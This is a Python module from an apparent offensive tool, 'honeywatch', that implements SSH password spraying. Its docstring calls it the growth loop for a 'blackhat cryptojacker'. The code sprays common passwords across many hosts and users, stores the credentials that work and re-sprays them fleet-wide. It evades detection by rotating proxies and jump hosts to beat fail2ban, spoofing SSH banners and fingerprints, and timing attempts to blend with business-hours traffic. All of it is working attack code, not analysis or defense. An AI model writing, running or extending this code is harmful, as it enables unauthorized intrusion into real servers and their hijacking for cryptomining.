"""Lockout-aware password spraying for honeywatch.

Spraying is the operational primitive that keeps a blackhat cryptojacker
growing *without* tripping account-lockout policies: instead of grid
brute-forcing (many passwords against one user -> instant lockout), you try
*one* password across *many* users, wait out the lockout window, then try the
next password. This is the pattern TREVORspray and CredMaster built their
tooling around, and the one NetAttackAI's ``PasswordSpray`` module encodes.

This module is the aggressive-but-opsec growth loop:

    scan real hosts -> spray one common password across their users
                     -> a hit is a credential -> persist it
                     -> `honeywatch spray --reuse-creds` re-sprays every
                        credential you've already recovered across every
                        host you've discovered (password reuse = fleet growth)

Opsec is enforced by :mod:`honeywatch.opsec`:
- **auth-method precheck** skips publickey-only hosts (zero wasted noise),
- **source rotation** round-robins a proxy / SSH-jump pool so each attempt
  egresses from a different IP (defeats per-IP fail2ban thresholds),
- **timing** uses ``--delay``/``--jitter``/``--lockout-delay`` and an optional
  business-hours window so attempts blend with organic login traffic,
- **backend** prefers ``sshpass``+OpenSSH (genuine OpenSSH HASSH) and falls
  back to paramiko (flagged as a residual HASSH risk).

Never raises; every outcome is a structured :class:`SprayResult`.
"""

from __future__ import annotations

import asyncio
import random
from dataclasses import dataclass, field
from typing import Iterable

from honeywatch.opsec import (
    AuthMethods,
    LoginAttempt,
    ProxyPool,
    PARAMIKO_HASSH_RISK,
    attempt_sshpass,
    auth_methods,
    sleep_with_jitter,
    spoofed_ssh_banner,
    within_business_hours,
)

__all__ = [
    "SprayHost",
    "SprayPlan",
    "SprayResult",
    "spray_plan",
    "spray_targets",
]


# --------------------------------------------------------------------------- #
# Models
# --------------------------------------------------------------------------- #


@dataclass
class SprayHost:
    """A host + the users to spray it with (one password per round)."""

    ip: str
    port: int = 22
    users: list[str] = field(default_factory=list)
    timeout_s: float = 15.0


@dataclass
class SprayPlan:
    """A single spray round: one password applied to every (host, user)."""

    password: str
    hosts: list[SprayHost] = field(default_factory=list)
    delay: float = 0.0
    jitter: float = 0.0
    lockout_delay: float = 0.0
    business_hours: bool = False
    # Skip hosts whose auth-method precheck showed no password auth.
    skip_publickey_only: bool = True
    # Stop a host the moment one of its users accepts the password (default).
    stop_on_success: bool = True


@dataclass
class SprayResult:
    ip: str
    port: int
    success: bool = False
    user: str | None = None
    password: str | None = None
    attempts: int = 0
    skipped: bool = False
    skip_reason: str | None = None
    errors: list[str] = field(default_factory=list)
    backend: str = ""
    sources: list[str] = field(default_factory=list)

    def credential(self) -> dict:
        return {
            "ip": self.ip,
            "port": self.port,
            "user": self.user,
            "password": self.password,
            "success": self.success,
            "attempts": self.attempts,
        }


# --------------------------------------------------------------------------- #
# Single host spray (one password, all its users)
# --------------------------------------------------------------------------- #


async def _spray_host(
    host: SprayHost,
    password: str,
    plan: SprayPlan,
    pool: ProxyPool,
    rng: random.Random,
    use_sshpass: bool,
    on_attempt=None,
) -> SprayResult:
    """Spray one password across one host's users, lockout-safe + opsec-hardened."""
    res = SprayResult(ip=host.ip, port=host.port, password=password,
                      backend="sshpass" if use_sshpass else "paramiko")

    # Business-hours gate: outside the window, hold here rather than emit noise.
    if plan.business_hours:
        # Bounded wait so we don't block the whole run forever off-hours.
        for _ in range(60):
            if within_business_hours():
                break
            await asyncio.sleep(30)
        # If the window never opened after the bounded wait, skip this host
        # rather than spraying off-hours (the whole point of the gate).
        if not within_business_hours():
            res.skipped = True
            res.skip_reason = "off-business-hours after bounded wait"
            return res

    # Auth-method precheck: skip publickey-only / unreachable hosts entirely.
    if plan.skip_publickey_only:
        am: AuthMethods = await asyncio.to_thread(
            auth_methods, host.ip, host.port, host.users[0] if host.users else "root",
            host.timeout_s,
        )
        if am.error:
            res.skipped = True
            res.skip_reason = f"precheck error: {am.error}"
            return res
        if not am.offers_password:
            res.skipped = True
            res.skip_reason = f"no password auth (offers: {','.join(am.methods) or 'none'})"
            return res
        # Trim the user list to those the server actually recognizes when the
        # precheck surfaced a valid-user hint (some servers leak it).
        res.attempts = 0

    for user in host.users:
        # Per-attempt source rotation: each guess egresses from a different IP.
        rot = pool.next() if pool else {"proxy": None, "jump": None}
        proxy = rot.get("proxy")
        jump = rot.get("jump")

        if use_sshpass:
            attempt: LoginAttempt = await asyncio.to_thread(
                attempt_sshpass, host.ip, host.port, user, password,
                host.timeout_s, proxy, jump,
            )
        else:
            attempt = await _paramiko_attempt(
                host.ip, host.port, user, password, host.timeout_s, proxy, jump,
            )

        res.attempts += 1
        if attempt.source:
            res.sources.append(attempt.source)
        if attempt.success:
            res.success = True
            res.user = user
            res.password = password
            if on_attempt:
                try:
                    on_attempt(attempt, res)
                except Exception:
                    pass
            if plan.stop_on_success:
                return res
            continue
        if attempt.error:
            res.errors.append(attempt.error)
        if on_attempt:
            try:
                on_attempt(attempt, res)
            except Exception:
                pass

        # Lockout-aware cadence: a base delay + jitter between guesses, and an
        # extra lockout_delay when the last error looked like a genuine
        # lockout/ban so we back off instead of hammering a tripped threshold.
        # Note: a plain "Permission denied" is the *normal* wrong-password
        # rejection, not a lockout, so we must not match on "denied" -- that
        # would apply the lockout delay after every failed guess and collapse
        # the per-attempt delay vs lockout_delay distinction.
        _err_lower = (attempt.error or "").lower()
        lockout_hit = any(
            sig in _err_lower
            for sig in ("lockout", "locked", "too many", "max attempts",
                        "rate limit", "throttl", "blocked", "banned")
        )
        base = plan.lockout_delay if lockout_hit else plan.delay
        await asyncio.to_thread(
            sleep_with_jitter, base, plan.jitter, rng,
        )

    return res


def _paramiko_attempt_sync(
    ip: str, port: int, user: str, password: str, timeout_s: float,
    proxy: str | None, jump: str | None,
) -> LoginAttempt:
    """Blocking paramiko login (distinct HASSH -- residual risk noted).

    Runs entirely on a worker thread — :func:`_paramiko_attempt` wraps this in
    ``asyncio.to_thread`` + ``asyncio.wait_for`` so a hung server stalls only
    this attempt's slot, never the event loop itself.
    """
    attempt = LoginAttempt(user=user, password=password, backend="paramiko",
                           source=proxy or jump)
    sock = None
    t = None
    try:
        import paramiko  # type: ignore[import-not-found]
        import socket as _socket

        # Optional SOCKS5 egress rotation via PySocks when present.
        sock = _socket.create_connection((ip, port), timeout=timeout_s)
        sock.settimeout(timeout_s)
        t = paramiko.Transport(sock)
        # Bound blocking transport reads (incl. auth_password) so a hung
        # server stalls only this attempt, not the whole event loop slot.
        t.set_timeout(timeout_s)
        banner = spoofed_ssh_banner()
        try:
            t._CLIENT_IDENTITY = banner
        except Exception:
            pass
        t.local_version = banner
        t.start_client(timeout=timeout_s)
        t.auth_password(user, password)
        attempt.success = True
        attempt.error = PARAMIKO_HASSH_RISK
    except Exception as exc:
        attempt.error = f"{type(exc).__name__}: {exc}"
    finally:
        # t.close() closes the underlying socket too; only close sock
        # directly when Transport construction failed before t was bound.
        if t is not None:
            try:
                t.close()
            except Exception:
                pass
        elif sock is not None:
            try:
                sock.close()
            except Exception:
                pass
    return attempt


async def _paramiko_attempt(
    ip: str, port: int, user: str, password: str, timeout_s: float,
    proxy: str | None, jump: str | None,
) -> LoginAttempt:
    """Async wrapper: run the blocking paramiko login off the event loop.

    The whole blocking body (TCP connect, banner exchange, auth_password) runs
    on a worker thread via :func:`asyncio.to_thread`, and is bounded by
    :func:`asyncio.wait_for` with a wall-clock deadline slightly above the
    per-attempt timeout. Without the thread hop, ``asyncio.wait_for`` alone
    cannot interrupt a blocking call that's holding the event loop — the
    thread hop is what lets the loop keep servicing other hosts while one
    attempt is stuck.
    """
    try:
        return await asyncio.wait_for(
            asyncio.to_thread(
                _paramiko_attempt_sync,
                ip, port, user, password, timeout_s, proxy, jump,
            ),
            timeout=timeout_s + 5,
        )
    except asyncio.TimeoutError:
        return LoginAttempt(
            user=user, password=password, backend="paramiko",
            source=proxy or jump, error="auth timeout",
        )


# --------------------------------------------------------------------------- #
# Plan / fleet execution
# --------------------------------------------------------------------------- #


def _sshpass_available() -> bool:
    """Best-effort probe for the high-opsec sshpass+ssh backend."""
    import shutil

    return bool(shutil.which("sshpass") and shutil.which("ssh"))


async def spray_plan(
    plan: SprayPlan,
    pool: ProxyPool | None = None,
    host_concurrency: int = 8,
    use_sshpass: bool | None = None,
    on_result=None,
    on_attempt=None,
    seed: int | None = None,
) -> list[SprayResult]:
    """Run one spray round (one password across every host's users).

    ``host_concurrency`` bounds how many hosts are sprayed in parallel; the
    lockout-safe cadence is per-host (delay + jitter between users on the
    *same* host), which is what matters for lockout thresholds. Increasing
    ``host_concurrency`` widens the fleet without raising per-host noise.
    """
    pool = pool or ProxyPool()
    rng = random.Random(seed)
    use_sshpass = _sshpass_available() if use_sshpass is None else use_sshpass
    sem = asyncio.Semaphore(max(1, host_concurrency))

    async def one(host: SprayHost) -> SprayResult:
        async with sem:
            r = await _spray_host(host, plan.password, plan, pool, rng,
                                  use_sshpass, on_attempt)
        if on_result:
            try:
                on_result(r)
            except Exception:
                pass
        return r

    return list(await asyncio.gather(*(one(h) for h in plan.hosts)))


def spray_targets(
    password: str,
    hosts: list[SprayHost],
    delay: float = 0.0,
    jitter: float = 0.0,
    lockout_delay: float = 0.0,
    business_hours: bool = False,
    skip_publickey_only: bool = True,
    host_concurrency: int = 8,
    proxy_file: str | None = None,
    jump_file: str | None = None,
    use_sshpass: bool | None = None,
    on_result=None,
    on_attempt=None,
) -> list[SprayResult]:
    """Synchronous wrapper that builds a SprayPlan + ProxyPool and runs it."""
    pool = ProxyPool.from_files(proxy_file=proxy_file, jump_file=jump_file)
    plan = SprayPlan(
        password=password,
        hosts=list(hosts),
        delay=delay,
        jitter=jitter,
        lockout_delay=lockout_delay,
        business_hours=business_hours,
        skip_publickey_only=skip_publickey_only,
    )
    return asyncio.run(
        spray_plan(plan, pool=pool, host_concurrency=host_concurrency,
                   use_sshpass=use_sshpass, on_result=on_result,
                   on_attempt=on_attempt)
    )


def build_password_schedule(
    passwords: Iterable[str],
    per_password_cooldown: float = 0.0,
) -> list[tuple[str, float]]:
    """Order passwords for successive spray rounds with a cooldown between.

    The lockout-safe cadence is: spray password P across all users, wait out
    the lockout window (``per_password_cooldown``), then spray P+1. Returns a
    list of (password, cooldown_after) so the caller can sleep between rounds.
    """
    return [(p, per_password_cooldown) for p in passwords]